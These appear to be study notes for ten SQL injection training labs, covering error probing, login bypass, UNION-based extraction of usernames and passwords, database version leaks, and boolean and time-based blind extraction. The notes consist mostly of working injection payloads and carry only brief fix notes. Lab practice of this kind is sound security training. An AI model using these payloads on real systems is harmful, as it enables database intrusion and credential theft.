## Lab 1
**Recon:**

- Find a URL param like `?category=Gifts` or `?productId=1`
    
- Add a `'` => `?productId=1'`
    
- If you see **SQL error** => you’re in.
    

**Payload:**

- Test classic `' OR 1=1--`
    
- Example: `?productId=1 OR 1=1--`
    
- Expected: all products returned, including hidden ones.'




## Lab 2

- **Goal:** Bypass login.
    
- **Recon:** Try `' OR '1'='1`
    
- **Payload:**
    
    vbnet
    
    CopyEdit
    
    `Username: ' OR '1'='1 Password: anything`
    
- **Success:** You’re logged in as first user.



## Lab 3

- **Goal:** Use UNION to get usernames/passwords.
    
- **Recon:**
    
    - `' ORDER BY 1--` … increase to find number of columns.
        
    - `' UNION SELECT NULL,NULL--`
        
- **Payload:**
    
    vbnet
    
    CopyEdit
    
    `' UNION SELECT username,password FROM users--`
    
- **Success:** DB leaks users.


## Lab 4 
- **Goal:** Get multiple values into 1 output.
    
- **Recon:** If only 1 column shown, concat.
    
- **Payload:**
    
    bash
    
    CopyEdit
    
    `' UNION SELECT NULL, username || '~' || password FROM users--`
    
    (Postgres: `||`, MySQL: `CONCAT()`)
    
- **Success:** User + pass in 1 column.
    
- **Fix:** Same as above.


## Lab 5

- **Goal:** Figure out which column shows text.
    
- **Recon:** `' UNION SELECT NULL,'abc'--`
    
- **Payload:**
    
    - Try text in each column.
        
- **Success:** ‘abc’ appears on page.
    
- **Fix:** Prepared statements.

## Lab 6 

- **Goal:** Count columns for UNION.
    
- **Recon:** `' ORDER BY N--` until error.
    
- **Payload:**
    
    - `' UNION SELECT NULL,NULL--`
        
- **Success:** No error = correct count.
    
- **Fix:** Parameterize.

## Lab 7 

- **Goal:** Extract version for Oracle.
    
- **Recon:** `' UNION SELECT banner,NULL FROM v$version--`
    
- **Payload:**
    
    swift
    
    CopyEdit
    
    `' UNION SELECT banner,NULL FROM v$version--`
    
- **Success:** DB version leaks.
    
- **Fix:** DB user shouldn’t have select on sys tables.


## Lab 8

- **Goal:** Leak version.
    
- **Payloads:**
    
    pgsql
    
    CopyEdit
    
    `' UNION SELECT @@version,NULL-- ' UNION SELECT version(),NULL--`
    
- **Success:** Version shows.
    
- **Fix:** See above.

## Lab 9 
- **Goal:** Extract using true/false.
    
- **Payload:**
    
    sql
    
    CopyEdit
    
    `' AND 1=1-- ' AND 1=2--`
    
- **Recon:** Response changes? Blind works.
    
- **Use:** Craft conditional dumps:
    
    vbnet
    
    CopyEdit
    
    `' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--`
    
- **Success:** Observe difference.
    
- **Fix:** Parameterize.


## Lab 10
- **Goal:** Extract with time.
    
- **Payload:**
    
    sql
    
    CopyEdit
    
    `' AND IF(1=1,SLEEP(5),0)-- ' WAITFOR DELAY '0:0:5'--`
    
- **Recon:** Response time = true.
    
- **Success:** Use for char brute:
    
    bash
    
    CopyEdit
    
    `' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0)--`


